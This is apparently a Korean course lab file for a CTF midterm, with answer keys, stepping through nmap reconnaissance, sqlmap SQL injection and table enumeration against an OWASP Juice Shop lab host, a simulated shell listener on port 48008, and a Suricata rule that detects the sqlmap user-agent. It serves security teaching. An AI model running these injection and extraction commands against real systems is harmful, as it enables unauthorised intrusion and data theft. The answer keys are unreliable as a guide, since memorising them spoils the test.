@@ -1,0 +1,476 @@
+lab_id: standalone-attack-week08
+title: "중간고사 CTF — 익스플로잇 체인으로 플래그(셸) 캡처"
+version: standalone-attack
+course: attack
+week: 8
+description: |
+  공격기법 W08 중간고사 CTF. W01–W07 에서 하나씩 익힌 개별 공격 기법(정찰·API/JWT·SQLi·XSS·
+  접근제어·SSRF/업로드)을 하나의 익스플로잇 체인으로 엮는다. 공격자(레드팀) 시선으로
+  정찰(nmap) → 웹 익스플로잇(SQLi 침투) → 셸 캡처(코드 실행 거점 = 리스너 포트 48008 = 플래그)의
+  4 단계를 수행하고, 그다음 방어자 시선으로 돌아서서 흩어진 흔적(WAF 913/942 + IDS + 호스트 포트)을
+  출처 IP(192.168.0.202)로 한 체인으로 역재구성한다. 정찰을 잡는 IDS 탐지 룰(sid 9408001)을 직접
+  작성·reload·트리거·검증 후 sid 로 삭제한다.
+  CTF 의 플래그는 "코드 실행을 증명하는 것" — 본 시험은 리스너 포트 48008 캡처를 플래그로 한다.
+  셸(리스너)·IDS 룰은 캡처·검증 직후 self-clean(공유 인프라 보존). 인가된 실습 환경(el34)에서만.
+  공격은 외부 공격자 VM 192.168.0.202(att/1)에서 공인 진입 192.168.0.161로 — `ssh att@192.168.0.202`(비번 1)로
+  접속해 수행하고, 방어 로그 확인은 방어 장비(`ssh ccc@10.20.31.2` IPS / `ssh ccc@10.20.32.80` WAF, 비번 1)에서 한다.
+  합격 임계값 0.7.
+difficulty: hard
+duration_minutes: 220
+prerequisites:
+  - "W01–W07 통과 (정찰·API/JWT·SQLi·XSS·접근제어·SSRF/업로드)"
+  - "공격 VM ssh att@192.168.0.202 + 표적/방어 장비 ssh ccc@10.20.32.80·10.20.31.2 (비번 1)"
+  - "lecture §1(왜 단일 취약점이 아니라 체인인가) §2(체인 4 단계) §3(진입 경로·플래그 정의) 숙지"
+objectives:
+  - "W01–W07 개별 기법을 정찰→침투→셸의 익스플로잇 체인으로 통합 구성"
+  - "CTF 플래그(코드 실행 거점 = 셸 리스너 포트 48008) 캡처·확인"
+  - "방어자 관점으로 WAF/IDS/호스트 흔적을 출처 IP 로 한 체인으로 역재구성"
+  - "정찰 탐지 IDS 룰(sid 9408001) 작성→reload→트리거→검증→삭제(베이스 보존)"
+  - "셸/룰 self-clean 으로 공유 인프라 보존, 증거 기반 CTF 보고서 작성"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 목표
+      익스플로잇 체인을 시작하기 전, 공격 도구가 갖춰져 있고 대상에 도달 가능한지 점검한다.
+
+      ## 📖 개념 한 줄
+      침투 테스트는 RoE(교전 규칙) 확인 직후 항상 **도구 가용성 + 대상 도달성**부터 점검한다.
+      도구가 없거나 대상이 무응답이면 체인을 시작할 수 없기 때문이다(lecture §7 미션 1).
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) 정찰 도구 nmap 설치 경로 확인
+      command -v nmap
+      # 2) SQLi 자동화 도구 sqlmap 설치 경로 확인
+      command -v sqlmap
+      # 3) 대상 vhost(dvwa) 도달성 + 지문 — whatweb(정찰 도구)로 상태코드·서버·타이틀 확인
+      whatweb -a1 http://dvwa.el34.lab/
+      ```
+      > 💡 대상 도달은 브라우저로 `http://dvwa.el34.lab/` 를 열어도 확인된다 — 여기선 whatweb 으로
+      > 상태코드 + 서버(Apache) + WAF 흔적을 한 번에 지문한다(nc 로 코드만 보는 것보다 정찰 정보가 많다).
+      - nmap(포트·서비스 스캐너, W01), sqlmap(SQLi 자동화, W04, 여기선 존재만 확인), whatweb(웹 지문 정찰) — 자연 URL `http://dvwa.el34.lab/`(호스트명이 vhost 지정).
+
+      ## ✅ 합격 기준
+      `nmap` 출력 시 통과. **근거:** nmap/sqlmap 경로가 보이고 dvwa 가 HTTP 코드로 응답하면 체인 시작
+      준비 완료다.
+    hint: 'nmap/sqlmap + 대상'
+    category: survey
+    points: 8
+    answer: |
+      # 1) 정찰 도구 nmap 설치 경로 확인
+      ssh att@192.168.0.202 'command -v nmap'
+      # 2) SQLi 자동화 도구 sqlmap 설치 경로 확인
+      ssh att@192.168.0.202 'command -v sqlmap'
+      # 3) 대상 vhost(dvwa) 도달성 + 지문 — whatweb 정찰
+      ssh att@192.168.0.202 'whatweb -a1 http://dvwa.el34.lab/'
+    answer_detail: "CTF 착수 점검 — 공격 도구(nmap 정찰 / sqlmap SQLi)와 대상(dvwa vhost) 도달성을 확인. nmap 경로가 출력되면 도구 준비 완료로 판정. 도달성은 whatweb 으로 상태코드+서버+WAF 흔적까지 지문한다. 도구·대상이 갖춰져야 정찰→침투→셸의 익스플로잇 체인을 시작할 수 있다."
+    expected_output: |
+      /usr/bin/nmap
+      /usr/bin/sqlmap
+      http://dvwa.el34.lab/ [403 Forbidden] Apache[2.4.52], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.161]
+    verify:
+      type: output_contains
+      expect: 'nmap'
+      field: stdout
+      semantic:
+        intent: "도구/대상 점검"
+        success_criteria: ["도구 + 대상"]
+        acceptable_methods: ["**[OSS] 점검 (권장)**"]
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## 🎯 목표 — 익스플로잇 체인 ① 정찰: 공격 표면 식별
+      nmap 으로 대상의 열린 포트를 매핑해 "어디로 들어갈 수 있는가"를 그린다.
+
+      ## 📖 개념 한 줄
+      **정찰(Recon)** 은 익스플로잇 체인의 첫 단계(PTES 1단계)다. 열린 포트·웹 vhost 가 곧 다음 단계의
+      **익스플로잇 후보**가 된다(lecture §2.1). 입구를 모르면 침투할 수 없다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) ① 정찰 — fw DNAT 공개 포트 스캔(open/PORT 줄만), 익스플로잇 후보 표면 매핑
+      nmap -p 80,443,8001-8007 192.168.0.161 -T4 --max-retries 1 2>/dev/null | grep -E "open|PORT"
+      ```
+      - `-T4`(빠른 타이밍, 빠를수록 IDS에 더 잘 잡힘=은밀성↔속도 trade-off), `-p`(스캔 포트, el34 fw DNAT 공개 포트). ⚠️ 정찰은 가장 시끄러운 단계 — 이 스캔 자체가 Suricata 에 흔적.
+
+      ## ✅ 합격 기준
+      `open` 출력 시 통과. **근거:** 열린 포트(open)가 식별되면 공격 표면 매핑 성공 — 이 포트·vhost 가
+      다음 침투 단계의 익스플로잇 후보다.
+    hint: 'nmap 포트'
+    category: recon
+    points: 10
+    answer: |
+      # 1) ① 정찰 — fw DNAT 공개 포트 스캔(open/PORT 줄만), 익스플로잇 후보 표면 매핑
+      ssh att@192.168.0.202 'nmap -p 80,443,8001-8007 192.168.0.161 -T4 --max-retries 1 2>/dev/null | grep -E "open|PORT"'
+    answer_detail: "익스플로잇 체인 1단계(정찰, PTES 1단계) — nmap 으로 대상 표면(열린 포트·서비스)을 매핑. open 포트가 출력되면 성공. 열린 포트·웹 vhost 가 다음 침투 단계의 익스플로잇 후보다. 빠른 스캔(-T4)은 그만큼 IDS 에 시끄럽게 잡힌다."
+    expected_output: |
+      PORT     STATE SERVICE
+      80/tcp   open  http
+      443/tcp  open  https
+      8001/tcp open  vcom-tunnel
+      8002/tcp open  teradataordbms
+      8003/tcp open  mcreport
+      8004/tcp open  p2pevolvenet
+      8005/tcp open  mxi
+      8006/tcp open  wpl-analytics
+      8007/tcp open  ajp12
+    verify:
+      type: output_contains
+      expect: 'open'
+      field: stdout
+      semantic:
+        intent: "정찰 표면 식별"
+        success_criteria: ["열린 포트"]
+        acceptable_methods: ["**[OSS] nmap (권장)**"]
+    target_vm: ips
+
+  - order: 3
+    instruction: |
+      ## 🎯 목표 — 익스플로잇 체인 ② 웹 익스플로잇: 진짜 sqlmap 으로 SQLi 침투 + DB 탈취
+      정찰로 dvwa 는 WAF 차단(step 5 에서 IDS 로 확인)임을 알았으니, **차단 안 되는 경로(juice, 탐지전용)**로
+      방향을 틀어 실제 SQL Injection 으로 웹앱 DB 를 탈취한다.
+
+      ## 📖 개념 한 줄
+      **웹 익스플로잇(Exploit)** 은 익스플로잇 체인의 침투 단계(PTES 4단계)다. 위조 UA 를 단 curl 한 발이
+      아니라 **진짜 sqlmap** 으로 파라미터를 자동 주입한다 — sqlmap 이 스스로 payload 를 변형하며 주입점을
+      찾고(boolean/time-based blind), 확인되면 DB 를 열거·탈취한다(lecture §2.2, W04 복습). dvwa 는 차단
+      모드라 sqlmap 이 "WAF/IPS 검출 → not injectable → --tamper 권유"로 막히지만, juice(탐지전용)의 검색
+      파라미터 `q` 는 통과되어 **실제 주입이 성립**한다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) ② 웹 익스플로잇 — 진짜 sqlmap 으로 juice 검색(q) 자동 SQLi 침투(탐지전용이라 통과 → 실제 주입 성립)
+      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --disable-coloring
+      # 2) 주입 확인되면 DB 테이블 열거 = 실제 데이터 유출(Users/Products/…)
+      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --tables --disable-coloring
+      ```
+      1) 은 `GET parameter 'q' is vulnerable`(SQLite, boolean/time-based blind)까지 확인한다. 2) 는 그 주입점을
+      재사용해 `SQLite_masterdb` 의 테이블(Users/Products/Captchas/Feedbacks/…)을 뽑아낸다 = 침투 성공.
+      > 💡 **화면으로 확인:** 브라우저에서 `http://juice.el34.lab/rest/products/search?q=apple'` 처럼 따옴표를
+      > 붙이면 SQL 오류로 응답이 달라진다(수동 주입 감각). 반복·자동화는 sqlmap 이 담당한다.
+      - dvwa 로 같은 sqlmap 을 돌리면 WAF 가 막아 `not injectable`(차단=탐지) → 그래서 juice 로 방향을 튼다.
+
+      ## ✅ 합격 기준
+      `vulnerable` 또는 테이블명(`Users`) 출력 시 통과. **근거:** 진짜 sqlmap 이 juice 의 `q` 를 주입 가능으로
+      판정하고 테이블을 열거하면 실제 침투 성공 = 익스플로잇 체인 침투 단계 완성.
+    hint: 'sqlmap 으로 juice ?q SQLi → --tables 로 DB 탈취'
+    category: manipulation
+    points: 12
+    answer: |
+      # 1) 진짜 sqlmap 으로 juice 검색(q) 자동 SQLi 침투(< /dev/null 로 비대화 고정)
+      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --disable-coloring < /dev/null 2>&1 | grep -iE "is vulnerable|Type:|back-end DBMS|Parameter:" | head'
+      # 2) 주입점 재사용해 DB 테이블 열거 = 실제 데이터 유출
+      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --tables --disable-coloring < /dev/null 2>&1 | grep -iE "Database:|Users|Products|Feedbacks|Captchas" | head'
+    answer_detail: "익스플로잇 체인 2단계(침투, PTES 4단계) — 위조 UA curl 이 아니라 진짜 sqlmap 으로 자동 SQLi. dvwa 는 WAF 차단(not injectable)이라 차단 안 되는 juice(탐지전용)의 검색 파라미터 q 로 전환하면 SQLite boolean/time-based blind 주입이 성립하고, --tables 로 SQLite_masterdb 의 실제 테이블(Users/Products/…)을 탈취한다. 실전 CTF 의 '차단 신호 읽고 우회 경로로 전환'을 그대로 재현. vulnerable/Users 가 보이면 침투 성공."
+    expected_output: |
+      GET parameter 'q' is vulnerable.
+      Type: boolean-based blind
+      Database: SQLite_masterdb
+      | Users |
+      | Products |
+    verify:
+      type: output_contains
+      expect: 'vulnerable'
+      field: stdout
+      semantic:
+        intent: "진짜 sqlmap 으로 실제 SQLi 침투 + DB 탈취"
+        success_criteria: ["sqlmap 주입 성공(vulnerable)", "테이블 열거(Users/Products)"]
+        acceptable_methods: ["**[OSS] sqlmap 자동 SQLi + --tables (권장)**", "**[OSS] 차단 dvwa→탐지전용 juice 전환**"]
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 목표 — 익스플로잇 체인 ③ 셸 캡처(플래그): 포트 48008
+      코드 실행 거점(셸)을 확보해 **플래그**를 캡처한다. 본 시험의 플래그 = 리스너 포트 48008.
+
+      ## 📖 개념 한 줄
+      CTF 의 **플래그는 "코드 실행을 증명하는 것"** 이다(lecture §2.3, §3.3). 침투로 확보한 코드 실행
+      능력을, 표적 호스트(web)에 **비표준 포트 48008 리스너**를 띄우는 것으로 모사·증명한다. 리스너가
+      떠 있음은 임의 프로세스를 실행할 수 있었다는 뜻 = 셸(코드 실행 거점) 확보.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **셸 캡처(표적 호스트 web):** 익스플로잇으로 확보한 코드 실행 거점 — `ssh ccc@10.20.32.80`(비번 `1`)로 표적 web 에서 실행한다.
+
+      ```bash
+      # 1) ③ 셸 캡처 — 표적 호스트(web)에 비표준 포트 48008 리스너 기동(코드 실행 거점 모사)
+      nohup python3 -m http.server 48008 >/dev/null 2>&1 &
+      # 2) 리스너가 뜰 때까지 대기 — 고정 sleep 이 아니라 포트가 열리면 즉시 진행(조건 폴링, 최대 5초)
+      timeout 5 bash -c 'until ss -tlnp | grep -q :48008; do :; done'
+      # 3) 포트 48008을 듣는 프로세스(pid) 확인 = 플래그(셸) 캡처 입증
+      ss -tlnp | grep ':48008'
+      # 4) self-clean — 리스너 즉시 종료([h]ttp 자기매치 방지)
+      pkill -f "[h]ttp.server 48008"
+      ```
+      `ss -tlnp` 출력에 포트 48008 과 주인 프로세스(pid)가 보이면 임의 프로세스를 띄울 수 있었다는 뜻 =
+      셸(코드 실행 거점) 확보 = 플래그 캡처. 공유 인프라라 확인 직후 pkill 로 리스너를 정리한다.
+      - `nohup ... &`(백그라운드 분리), `until ss ... grep -q :48008`(포트가 열릴 때까지 조건 폴링 — 고정 대기 대신 실제 상태를 본다), `[h]ttp` 대괄호(pkill 자기매치 방지). ⚠️ 공유 인프라라 확인 직후 self-clean.
+
+      ## ✅ 합격 기준
+      `48008` 출력 시 통과. **근거:** osquery 결과에 포트 48008 과 주인 프로세스(pid)가 보이면 플래그(셸)
+      캡처 = 익스플로잇 체인 완성 — 확인 직후 pkill 로 리스너를 정리한다(self-clean).
+    hint: '리스너 48008 = 플래그'
+    category: manipulation
+    points: 14
+    answer: |
+      # ③ 셸 캡처 — 리스너 기동 → 조건 폴링 대기 → ss로 48008 확인 → self-clean(한 세션에서 원자 실행)
+      ssh ccc@10.20.32.80 'nohup python3 -m http.server 48008 >/dev/null 2>&1 &
+      timeout 5 bash -c "until ss -tlnp | grep -q :48008; do :; done"
+      ss -tlnp | grep ":48008"
+      pkill -f "[h]ttp.server 48008"'
+    answer_detail: "익스플로잇 체인 3단계 = 플래그 캡처(PTES 5단계의 첫 발). CTF 플래그는 코드 실행을 증명하는 것 — 비표준 포트 48008 리스너로 코드 실행 거점(셸)을 모사·확보. 고정 sleep 대신 'until ss grep -q :48008' 조건 폴링으로 리스너가 뜰 때까지 기다렸다가(포트가 열리면 즉시) ss -tlnp 로 포트 48008 과 주인 pid 를 확인하면 플래그 캡처 입증 = 체인 완성. 출력에 48008 이 포함되면 통과. 공유 인프라 보존을 위해 확인 즉시 pkill 로 self-clean."
+    expected_output: |
+      LISTEN 0      5            0.0.0.0:48008      0.0.0.0:*    users:(("python3",pid=53649,fd=3))
+    verify:
+      type: output_contains
+      expect: '48008'
+      field: stdout
+      semantic:
+        intent: "셸 캡처(플래그) 획득"
+        success_criteria: ["리스너 48008 캡처", "ss 조건폴링 확인"]
+        acceptable_methods: ["**[OSS] 리스너 + ss(조건폴링) (권장)**"]
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## 🎯 목표 — 방어자의 시선 ④ IDS 탐지 룰(sid 9408001)
+      방어자(블루팀) 관점으로 돌아서서, 정찰(스캐너 UA)을 체인 초기에 잡는 IDS 룰을 직접 작성·검증한다.
+
+      ## 📖 개념 한 줄
+      좋은 공격자는 자기 정찰이 어떻게 탐지되는지 안다(lecture §1.3). WAF 는 HTTP 도착 후에 보지만
+      **IDS 는 네트워크에서** 본다. Suricata `local.rules` 에 스캐너 UA 탐지 룰을 만들어 "탐지를 설계하는"
+      능력을 평가한다. 룰 수명주기 = 작성 → reload → 트리거 → eve 확인 → **sid 로 삭제**(베이스 보존).
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실행 위치:** 룰 작성·reload·확인·정리는 `el34-ips`, UA 트리거만 `외부 공격자 VM 192.168.0.202`.
+
+      ```bash
+      # ── el34-ips 에서: IDS 룰 추가 + reload ──
+      # 1) IDS 룰 추가 — sqlmap UA 정찰 탐지(http.user_agent content, sid 9408001)
+      sudo bash -c "cat >> /etc/suricata/rules/local.rules <<EOF
+      alert http any any -> any any (msg:\"CTF8 sqlmap recon\"; http.user_agent; content:\"sqlmap\"; nocase; fast_pattern; sid:9408001; rev:1;)
+      EOF"
+      # 2) 무중단 reload — suricatasc는 reload 완료 후 반환(동기)하므로 별도 대기 불필요
+      sudo suricatasc -c reload-rules
+      # ── 외부 공격자 VM 192.168.0.202 에서: 진짜 sqlmap 으로 트리거(sqlmap 이 자기 UA 'sqlmap/x'를 그대로 보냄) ──
+      timeout 30 sqlmap -u "http://dvwa.el34.lab/?id=ct8b" --batch --level=1 --disable-coloring < /dev/null >/dev/null 2>&1
+      # ── el34-ips 에서: eve 확인 + self-clean ──
+      # 3) eve.json에 시그니처가 기록될 때까지 대기(고정 sleep 대신 조건 폴링) 후 확인
+      timeout 8 bash -c 'until sudo grep -q 9408001 /var/log/suricata/eve.json; do :; done'
+      sudo grep "9408001" /var/log/suricata/eve.json | tail -1 | jq '{sig:.alert.signature}'
+      # 4) self-clean — 룰 삭제 + reload(베이스 보존)
+      sudo sed -i "/sid:9408001/d" /etc/suricata/rules/local.rules; sudo suricatasc -c reload-rules >/dev/null; echo rule_removed
+      ```
+      UA 를 위조하지 않고 **진짜 sqlmap** 을 돌리면 sqlmap 이 자기 User-Agent(`sqlmap/1.6.4#stable ...`)를
+      그대로 보내므로 같은 룰(9408001)이 자연히 발화한다 — 여기서 관찰할 것은 sqlmap 의 SQLi 성공 여부가
+      아니라 IDS 가 남긴 **eve.json 경보**라서 sqlmap 출력은 `>/dev/null` 로 버린다. (sqlmap 은 여러 요청을
+      보내므로 경보가 여러 건 남는다 — 요청 한 발보다 실제 스캐너 트래픽에 가깝다.)
+      - `http.user_agent; content:"sqlmap"; nocase`(진짜 sqlmap 의 UA 문자열 매치), `fast_pattern`(성능), `sid:9408001`(내 네임스페이스 9408xxx). `suricatasc -c reload-rules`(무중단), 끝나면 sed 로 삭제→reload(base 보존).
+
+      ## ✅ 합격 기준
+      `CTF8 sqlmap` 출력 시 통과. **근거:** eve.json 에 CTF8 sqlmap recon 시그니처가 잡히고 정리 후
+      local.rules 에서 9408001 이 사라지면 통과 — base 룰은 절대 건드리지 않고 9408xxx 만 쓴다.
+    hint: 'sqlmap UA 룰(9408001) → eve → 삭제'
+    category: manipulation
+    points: 14
+    answer: |
+      # 1) IDS 룰 추가 — sqlmap UA 정찰 탐지(http.user_agent content, sid 9408001)
+      ssh ccc@10.20.31.2 'sudo bash -c "cat >> /etc/suricata/rules/local.rules <<EOF
+      alert http any any -> any any (msg:\"CTF8 sqlmap recon\"; http.user_agent; content:\"sqlmap\"; nocase; fast_pattern; sid:9408001; rev:1;)
+      EOF"'
+      # 2) 무중단 reload(동기 반환) 후 진짜 sqlmap 으로 트리거(sqlmap 이 자기 UA 를 그대로 발신)
+      ssh ccc@10.20.31.2 'sudo suricatasc -c reload-rules'
+      ssh att@192.168.0.202 'timeout 30 sqlmap -u "http://dvwa.el34.lab/?id=ct8b" --batch --level=1 --disable-coloring < /dev/null >/dev/null 2>&1'
+      # 3) eve.json에 시그니처 기록될 때까지 조건 폴링 후 확인
+      ssh ccc@10.20.31.2 'timeout 8 bash -c "until sudo grep -q 9408001 /var/log/suricata/eve.json; do :; done"; sudo grep "9408001" /var/log/suricata/eve.json | tail -1 | jq "{sig:.alert.signature}"'
+      # 4) self-clean — 룰 삭제 + reload(베이스 보존)
+      ssh ccc@10.20.31.2 'sudo sed -i "/sid:9408001/d" /etc/suricata/rules/local.rules; sudo suricatasc -c reload-rules >/dev/null; echo rule_removed'
+    answer_detail: "방어자 관점 — 익스플로잇 체인의 정찰(sqlmap UA)을 IDS 룰(sid 9408001)로 네트워크 계층에서 탐지. 룰 수명주기 전체(작성→무중단 reload→트리거→eve 확인→sed 삭제) 수행. eve.json 에 'CTF8 sqlmap' 시그니처가 잡히면 탐지 성공. 같은 sqlmap UA 를 WAF 는 HTTP 의미(913)로, IDS 는 네트워크 UA 문자열로 본다는 교차 학습. 끝나면 sid 로 삭제해 base 룰 보존(공유 인프라)."
+    expected_output: |
+      {"message": "done", "return": "OK"}
+      {
+        "sig": "CTF8 sqlmap recon"
+      }
+      rule_removed
+    verify:
+      type: output_contains
+      expect: 'CTF8 sqlmap'
+      field: stdout
+      semantic:
+        intent: "IDS 탐지 룰로 정찰 탐지"
+        success_criteria: ["sid 9408001 발화", "삭제 보존"]
+        acceptable_methods: ["**[OSS] http.user_agent 룰 (권장)**"]
+    target_vm: ips
+
+  - order: 6
+    instruction: |
+      ## 🎯 목표 — 방어자의 시선 ⑤ 익스플로잇 체인 역재구성
+      흩어진 흔적(WAF 룰 ID + IDS + 호스트 포트)을 모아 공격자가 밟은 체인을 한 줄로 다시 그린다.
+
+      ## 📖 개념 한 줄
+      **역재구성**은 방어자가 흩어진 점(흔적)을 출처 IP 하나로 한 선(체인)으로 잇는 작업이다(lecture §2.4,
+      §6). 공격자는 흔적을 흩어 남기지만, el34 가 출처 IP(192.168.0.202)를 전 계층에 보존하므로 방어자는
+      정찰(913)·침투(942)·셸(48008)을 한 공격자의 한 경로로 묶을 수 있다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **셸 캡처(표적 호스트 web):** 익스플로잇으로 확보한 코드 실행 거점 — `ssh ccc@10.20.32.80`(비번 `1`)로 표적 web 에서 실행한다.
+
+      ```bash
+      # 1) WAF audit 최근 100줄에서 CRS 룰ID 추출·중복제거 후 체인 3단계(정찰 913/침투 942/차단 949)만
+      sudo tail -100 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | grep -E "913|942|949"
+      ```
+      추출된 룰 ID 를 공격 단계에 매핑해 읽는다 — 913(정찰 스캐너)·942(SQLi 침투)·949110(anomaly 누적 차단).
+      이 WAF 흔적 + IDS(sid 9408001) + 호스트 포트 48008(셸)이 모두 같은 출처 192.168.0.202 면 정찰→침투→셸의
+      한 공격자 체인으로 역재구성된다 — 방어는 이 체인을 어느 단계에서든 끊으면 공격을 막는다.
+      - **913**=정찰(스캐너), **942**=SQLi 침투, **949110**=anomaly 누적 차단(403), 호스트 포트 **48008**=셸. 세 흔적이 같은 출처 192.168.0.202 면 한 공격자의 정찰→침투→셸 체인.
+
+      ## ✅ 합격 기준
+      `942` 출력 시 통과. **근거:** modsec 흔적에서 룰 ID(942 등)를 추출해 정찰→침투→셸의 익스플로잇
+      체인으로 종합하면 통과 — 방어는 어느 단계에서든 체인을 끊으면 공격을 막는다.
+    hint: 'modsec 흔적으로 체인 재구성'
+    category: analysis
+    points: 12
+    answer: |
+      # 1) WAF audit 최근 100줄에서 CRS 룰ID 추출·중복제거 후 체인 3단계(정찰 913/침투 942/차단 949)만
+      ssh ccc@10.20.32.80 'sudo tail -100 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | grep -E "913|942|949"'
+    answer_detail: "방어자 관점 — 흩어진 흔적(WAF 913 정찰 / 942 SQLi 침투 + IDS sid 9408001 + 호스트 포트 48008 셸)을 출처 IP(192.168.0.202)로 묶어 한 익스플로잇 체인으로 역재구성. modsec_audit 에서 룰 ID(942 등)가 추출되면 통과. 정찰→침투→셸 경로를 복원하고, 방어는 어느 단계에서든 체인을 끊으면 막는다는 것을 입증."
+    expected_output: |
+      913100
+      913101
+      913120
+      942100
+      942190
+      942260
+      949110
+    verify:
+      type: output_contains
+      expect: '942'
+      field: stdout
+      semantic:
+        intent: "익스플로잇 체인 역재구성"
+        success_criteria: ["WAF/IDS/호스트 흔적 종합"]
+        acceptable_methods: ["**[OSS] modsec 흔적 (권장)**"]
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 목표 — 플래그 검증 + self-clean
+      플래그 캡처를 입증한 뒤, 심은 흔적(셸 리스너 48008 / IDS 룰 9408001)이 모두 정리됐는지 검증한다.
+
+      ## 📖 개념 한 줄
+      el34 는 공유 인프라다. CTF 흔적을 끝까지 남기면 다음 학생·운영에 영향을 준다. 각 미션에서 심은 것을
+      그 미션에서 정리(self-clean)했으니, 여기서 **잔재 0** 을 최종 확인한다(lecture §8).
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실행 위치:** 셸 잔재는 `el34-web`, IDS 룰 잔재는 `el34-ips` 에서 확인.
+
+      ```bash
+      # ── el34-web 에서: 셸 리스너 잔재 ──
+      # 1) 셸 리스너(48008) 정리 후 잔재 확인(살아있으면 셸 잔재!, 없으면 shell clean)
+      pkill -f "[h]ttp.server 48008"; pgrep -f "[h]ttp.server 48008" && echo "셸 잔재!" || echo "shell clean"
+      # ── el34-ips 에서: IDS 룰 잔재 ──
+      # 2) IDS 룰(9408001) 잔재 확인 — 매치 줄이 나오면 잔재, 없으면 clean(베이스 보존)
+      sudo grep 9408001 /etc/suricata/rules/local.rules && echo "룰 잔재!" || echo "IDS rule clean"
+      ```
+      두 확인 모두 clean 이면 CTF 흔적(셸 리스너·IDS 룰)이 남김없이 정리된 것 = 공유 인프라 원상복구 완료다.
+      - `pgrep -f "[h]ttp.server 48008"`(48008 리스너 잔존 확인, `[h]`는 grep 자기매치 방지), `grep 9408001 ... && ... || ...`(룰 잔재 줄을 실제로 보이거나 clean 판정 — 카운트 숫자가 아니라 내용으로 확인).
+
+      ## ✅ 합격 기준
+      `shell clean` 출력 시 통과. **근거:** 48008 리스너 잔재 0(shell clean) + 9408001 잔재 카운트 0 이면
+      통과 — 잔재가 있으면 해당 미션(4 셸/5 룰)의 정리 명령을 다시 실행한다.
+    hint: '48008 셸 정리 + 9408001 룰 잔재 0'
+    category: cleanup
+    points: 10
+    answer: |
+      # 1) 셸 리스너(48008) 정리 후 잔재 확인(살아있으면 셸 잔재!, 없으면 shell clean)
+      ssh ccc@10.20.32.80 'pkill -f "[h]ttp.server 48008"; pgrep -f "[h]ttp.server 48008" && echo "셸 잔재!" || echo "shell clean"'
+      # 2) IDS 룰(9408001) 잔재 확인 — 매치 줄이 나오면 잔재, 없으면 clean(베이스 보존)
+      ssh ccc@10.20.31.2 'sudo grep 9408001 /etc/suricata/rules/local.rules && echo "룰 잔재!" || echo "IDS rule clean"'
+    answer_detail: "CTF 마무리 = 플래그(48008) 캡처 입증 + 셸/IDS룰 self-clean 검증. 셸 리스너가 정리됐으면 'shell clean', IDS 룰(9408001)이 local.rules 에 없으면 'IDS rule clean'(베이스 보존 완료 — 카운트 숫자가 아니라 grep 매치 유무로 판정). 'shell clean' 출력이 보이면 통과. 공유 인프라에서 변경분(발판·룰)을 추적·원복하는 변경 관리 규율."
+    expected_output: |
+      shell clean
+      IDS rule clean
+    verify:
+      type: output_contains
+      expect: 'shell clean'
+      field: stdout
+      semantic:
+        intent: "플래그 검증 + 정리"
+        success_criteria: ["셸 잔재 0", "룰 잔재 0"]
+        acceptable_methods: ["**[OSS] 잔재 점검 (권장)**"]
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## 🎯 목표 — CTF 보고서: 익스플로잇 체인 종합
+      미션 1–7 을 한 익스플로잇 체인의 단계별로 정리해, 종합 판단을 문서로 입증한다(PTES 6단계 보고).
+
+      ## 📖 개념 한 줄
+      침투 테스트의 가치는 발견을 **경로(체인)** 로 설명하는 데 있다(lecture §7 미션 8). 단일 취약점
+      나열보다, "정찰→침투→셸"의 경로로 엮어 "어떻게 코드 실행까지 도달했는가"를 보이는 것이 설득력 있다.
+
+      ## 💻 실행 방법 — 편집기로 CTF 보고서 작성
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 `nano ~/w08_ctf_report.md` 를 열고, 미션 1~7 의
+      증거(스캔 결과·응답 코드·룰 ID·ss 결과)를 아래 골격에 채워 저장한다(Ctrl+O 저장, Ctrl+X 종료).
+      "땄다"가 아니라 증거가 점수다 — `<관찰값>` 은 실제로 본 값으로 채운다.
+
+      ```markdown
+      # 공격 W08 — CTF 익스플로잇 체인 보고서
+      ## 1. 정찰 : nmap으로 표면(포트/vhost) 식별 — 열린 포트 <관찰값>
+      ## 2. 익스플로잇 체인 : 정찰 → 웹 익스플로잇(SQLi 942, exploit=403) → 발판 → 셸
+      ## 3. 플래그 : 셸 캡처(리스너 포트 48008 = 코드 실행 거점, ss로 확인)
+      ## 4. 방어자 : WAF(913/942) + IDS(sid 9408001) + 호스트(48008) 흔적을 출처 192.168.0.202로 체인 역재구성
+      ## 결론 : 개별 취약점을 체인으로 엮어 코드 실행까지 도달. 방어는 어느 단계서든 체인을 끊으면 막는다
+      ```
+      작성 후 `cat ~/w08_ctf_report.md` 로 확인한다 — 보고서는 heredoc 출력이 아니라 편집기로 직접 쓴 산출물이다.
+
+      ## ✅ 합격 기준
+      `체인` 출력 시 통과. **근거:** 보고서에 정찰·익스플로잇 체인·플래그·방어자 역재구성이 모두
+      포함되면 통과 — 발견을 단일 취약점 나열이 아닌 경로(체인)로 설명하는 것이 핵심이다.
